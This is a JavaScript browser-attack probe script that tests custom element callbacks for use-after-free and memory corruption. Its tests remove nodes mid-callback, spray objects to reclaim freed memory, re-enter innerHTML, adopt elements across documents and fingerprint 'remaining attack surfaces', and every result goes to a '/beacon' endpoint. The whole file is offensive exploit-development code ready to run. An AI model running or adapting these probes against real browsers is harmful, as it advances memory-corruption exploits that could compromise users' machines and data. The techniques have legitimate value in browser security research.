// p514-ce-reentry-uaf.js — Custom Element re-entrancy UAF probes
// Tests DOM mutation during custom element callbacks for UAF/corruption
// Beacon prefix: V514-

(function() {
  var B = 'V514-';
  function beacon(tag, val) {
    try { new Image().src = '/beacon?tag=' + B + tag + '&v=' + encodeURIComponent(String(val).substring(0, 200)); } catch(e) {}
  }

  var results = {};

  // T1: connectedCallback removes parent during insertion
  // If the parser inserts our CE, connectedCallback fires synchronously.
  // Removing the parent during callback tests if parser holds stale pointers.
  try {
    var t1_crash = false;
    class T1Element extends HTMLElement {
      connectedCallback() {
        if (this.parentNode && this.parentNode.parentNode) {
          this.parentNode.parentNode.removeChild(this.parentNode);
        }
      }
    }
    customElements.define('t1-remove-parent', T1Element);

    var container = document.createElement('div');
    var wrapper = document.createElement('div');
    container.appendChild(wrapper);
    document.body.appendChild(container);
    // innerHTML triggers parser which creates CE and fires connectedCallback
    wrapper.innerHTML = '<t1-remove-parent></t1-remove-parent>';
    results.T1 = 'SURVIVED';
  } catch(e) {
    results.T1 = 'ERR:' + e.message;
  }
  beacon('T1', results.T1);

  // T2: connectedCallback triggers GC + creates many objects to reclaim memory
  try {
    var t2_freed = false;
    class T2Element extends HTMLElement {
      connectedCallback() {
        // Remove self from parent to drop last reference
        if (this.parentNode) this.parentNode.removeChild(this);
        // Spray objects to try to reclaim the freed slot
        var spray = [];
        for (var i = 0; i < 100; i++) {
          spray.push({a: i, b: i+1, c: 'x'.repeat(32)});
        }
        t2_freed = true;
      }
    }
    customElements.define('t2-self-remove', T2Element);

    var div2 = document.createElement('div');
    document.body.appendChild(div2);
    div2.innerHTML = '<t2-self-remove></t2-self-remove><t2-self-remove></t2-self-remove><t2-self-remove></t2-self-remove>';
    results.T2 = 'SURVIVED-freed=' + t2_freed;
  } catch(e) {
    results.T2 = 'ERR:' + e.message;
  }
  beacon('T2', results.T2);

  // T3: attributeChangedCallback during innerHTML modifies tree
  try {
    var t3_count = 0;
    class T3Element extends HTMLElement {
      static get observedAttributes() { return ['data-x']; }
      attributeChangedCallback(name, oldVal, newVal) {
        t3_count++;
        if (t3_count === 1) {
          // During attribute set, modify the document tree
          var sibling = this.nextSibling;
          if (sibling && sibling.parentNode) {
            sibling.parentNode.removeChild(sibling);
          }
          // Also add new elements
          var extra = document.createElement('div');
          extra.textContent = 'injected';
          if (this.parentNode) this.parentNode.appendChild(extra);
        }
      }
    }
    customElements.define('t3-attr-mutate', T3Element);

    var div3 = document.createElement('div');
    document.body.appendChild(div3);
    div3.innerHTML = '<t3-attr-mutate data-x="1"></t3-attr-mutate><span>target</span><t3-attr-mutate data-x="2"></t3-attr-mutate>';
    results.T3 = 'SURVIVED-count=' + t3_count;
  } catch(e) {
    results.T3 = 'ERR:' + e.message;
  }
  beacon('T3', results.T3);

  // T4: MutationObserver callback during custom element upgrade
  // Register MO before defining CE, then define CE to trigger upgrade
  try {
    var t4_mo_fired = false;
    var t4_ce_fired = false;
    var div4 = document.createElement('div');
    document.body.appendChild(div4);
    div4.innerHTML = '<t4-deferred-ce id="t4target"></t4-deferred-ce>';

    var mo = new MutationObserver(function(mutations) {
      t4_mo_fired = true;
      // During MO callback, remove the element being upgraded
      var el = document.getElementById('t4target');
      if (el && el.parentNode) el.parentNode.removeChild(el);
    });
    mo.observe(div4, { childList: true, subtree: true });

    class T4Element extends HTMLElement {
      connectedCallback() { t4_ce_fired = true; }
    }
    // Define triggers upgrade of existing <t4-deferred-ce>
    customElements.define('t4-deferred-ce', T4Element);

    // Force microtask checkpoint
    Promise.resolve().then(function() {});
    results.T4 = 'SURVIVED-mo=' + t4_mo_fired + '-ce=' + t4_ce_fired;
  } catch(e) {
    results.T4 = 'ERR:' + e.message;
  }
  beacon('T4', results.T4);

  // T5: adoptNode during connectedCallback — move element to different document
  try {
    var t5_adopted = false;
    var iframe5 = document.createElement('iframe');
    document.body.appendChild(iframe5);

    class T5Element extends HTMLElement {
      connectedCallback() {
        if (!t5_adopted && iframe5.contentDocument) {
          t5_adopted = true;
          // Adopt self into iframe document during connected callback
          iframe5.contentDocument.adoptNode(this);
          iframe5.contentDocument.body.appendChild(this);
        }
      }
    }
    customElements.define('t5-adopt-escape', T5Element);

    var div5 = document.createElement('div');
    document.body.appendChild(div5);
    div5.innerHTML = '<t5-adopt-escape></t5-adopt-escape>';
    results.T5 = 'SURVIVED-adopted=' + t5_adopted;
  } catch(e) {
    results.T5 = 'ERR:' + e.message;
  }
  beacon('T5', results.T5);

  // T6: disconnectedCallback triggered during innerHTML replacement
  // Race between cleanup and re-creation
  try {
    var t6_disconnected = 0;
    var t6_connected = 0;
    class T6Element extends HTMLElement {
      connectedCallback() { t6_connected++; }
      disconnectedCallback() {
        t6_disconnected++;
        // During disconnect, modify the parent
        if (this.parentNode) {
          try {
            this.parentNode.innerHTML = '<span>replaced</span>';
          } catch(e) {}
        }
      }
    }
    customElements.define('t6-disconnect-mutate', T6Element);

    var div6 = document.createElement('div');
    document.body.appendChild(div6);
    div6.innerHTML = '<t6-disconnect-mutate></t6-disconnect-mutate>';
    // Now replace innerHTML — triggers disconnectedCallback which modifies innerHTML again
    div6.innerHTML = '<t6-disconnect-mutate></t6-disconnect-mutate>';
    results.T6 = 'SURVIVED-conn=' + t6_connected + '-disc=' + t6_disconnected;
  } catch(e) {
    results.T6 = 'ERR:' + e.message;
  }
  beacon('T6', results.T6);

  // T7: Feature fingerprint for remaining attack surfaces
  try {
    var features = {};
    features.customElements = typeof customElements !== 'undefined';
    features.dialog = typeof HTMLDialogElement !== 'undefined';
    features.dateInput = (function() {
      var i = document.createElement('input');
      i.type = 'date';
      return i.type === 'date';
    })();
    features.resizeObserver = typeof ResizeObserver !== 'undefined';
    features.intersectionObserver = typeof IntersectionObserver !== 'undefined';
    features.mutationObserver = typeof MutationObserver !== 'undefined';
    features.clipboard = !!(navigator.clipboard && navigator.clipboard.write);
    features.mediaSource = typeof MediaSource !== 'undefined';
    features.indexedDB = typeof indexedDB !== 'undefined';
    features.webCrypto = !!(window.crypto && window.crypto.subtle);
    features.performance = typeof PerformanceObserver !== 'undefined';
    features.webAnimation = typeof Animation !== 'undefined';
    features.shadowDOM = typeof Element.prototype.attachShadow !== 'undefined';
    features.intlSegmenter = typeof Intl !== 'undefined' && typeof Intl.Segmenter !== 'undefined';

    var featStr = Object.keys(features).filter(function(k) { return features[k]; }).join(',');
    results.T7 = featStr;
  } catch(e) {
    results.T7 = 'ERR:' + e.message;
  }
  beacon('T7', results.T7);

  // Summary beacon
  setTimeout(function() {
    var summary = Object.keys(results).map(function(k) { return k + '=' + results[k]; }).join('|');
    beacon('DONE', summary);
  }, 2000);
})();
